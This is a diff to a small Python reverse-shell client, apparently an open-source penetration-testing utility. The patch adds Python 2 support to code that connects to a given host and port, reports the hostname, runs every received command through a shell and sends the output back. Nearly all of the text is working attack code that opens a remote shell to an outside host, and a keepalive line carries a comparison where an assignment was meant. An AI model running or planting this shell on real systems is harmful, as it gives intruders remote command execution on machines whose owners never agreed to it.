@@ -1,8 +1,8 @@
-#!/usr/bin/env python3
+#!/usr/bin/env python
 
 # MIT License
 # 
-# Copyright (c) 2017 Dan Persons (dpersonsdev@gmail.com)
+# Copyright (c) 2018 Dan Persons (dpersonsdev@gmail.com)
 # 
 # Permission is hereby granted, free of charge, to any person obtaining a copy
 # of this software and associated documentation files (the "Software"), to deal
@@ -24,7 +24,7 @@
 
 from argparse import ArgumentParser
 import socket
-from sys import exit
+from sys import exit, version_info
 from subprocess import check_output, STDOUT, CalledProcessError
 from time import sleep
 
@@ -39,6 +39,7 @@ class RSCliCore:
 
         self.args = None
         self.arg_parser = ArgumentParser()
+        self.pyversion = version_info.major
 
 
     def get_args(self):
@@ -64,45 +65,61 @@ class RSCliCore:
 
     def main_event(self):
         """Send a shell to a remote host"""
-        with socket.socket() as s:
-            try:
-                s.connect((self.args.host, self.args.port))
-            except ConnectionRefusedError:
-                print('Error: Connection refused for host '+ self.args.host + \
-                        ' port ' + str(self.args.port) + '.')
-                exit(1)
-            s.send(bytes(socket.gethostname(), 'utf8'))
+        s = socket.socket()
+        try:
+            s.connect((self.args.host, self.args.port))
+        except ConnectionRefusedError:
+            print('Error: Connection refused for host '+ self.args.host + \
+                    ' port ' + str(self.args.port) + '.')
+            exit(1)
+        if self.pyversion == 2:
+            s.send(socket.gethostname() + ':2')
+        else:
+            s.send(bytes(socket.gethostname() + ':3', 'utf8'))
 
-            keepalivetimer = 900
-            while True:
+        keepalivetimer = 900
+        while True:
+            if self.pyversion == 2:
+                cmd = str(s.recv(1024))
+            else:
                 cmd = str(s.recv(1024))[2:-1]
-                if cmd:
-                    if self.args.verbose:
-                        print(cmd)
-                    if cmd == 'exit':
-                        s.close()
-                        exit(0)
-                    else:
-                        try:
-                            procoutput = check_output(cmd, shell = True,
-                                    stderr=STDOUT)
-                        except CalledProcessError:
+            if cmd:
+                if self.args.verbose:
+                    print(cmd)
+                if cmd == 'exit':
+                    s.close()
+                    exit(0)
+                else:
+                    try:
+                        procoutput = check_output(cmd, shell = True,
+                                stderr=STDOUT)
+                    except CalledProcessError:
+                        if self.pyversion == 2:
+                            procoutput = 'Error: ' + cmd + \
+                                    ' returned non-zero exit code.\n'
+                        else:
                             procoutput = bytes('Error: ' + cmd + \
                                     ' returned non-zero exit code.\n', 'utf8')
-                        if procoutput:
-                            s.send(procoutput)
+                    if procoutput:
+                        s.send(procoutput)
+                    else:
+                        if self.pyversion == 2:
+                            s.send('\n')
                         else:
                             s.send(bytes('\n', 'utf8'))
-                        keepalivetimer = 900
-                else:
-                    if self.args.keepalive:
-                        if keepalivetimer == 0:
-                            s.send(bytes('\n', 'utf8'))
-                            keepalivetimer == 900
+                    keepalivetimer = 900
+            else:
+                if self.args.keepalive:
+                    if keepalivetimer == 0:
+                        if self.pyversion == 2:
+                            s.send('\n')
                         else:
-                            keepalivetimer -= 1
+                            s.send(bytes('\n', 'utf8'))
+                        keepalivetimer == 900
+                    else:
+                        keepalivetimer -= 1
 
-                    sleep(0.1)
+                sleep(0.1)
 
 
     def run_script(self):
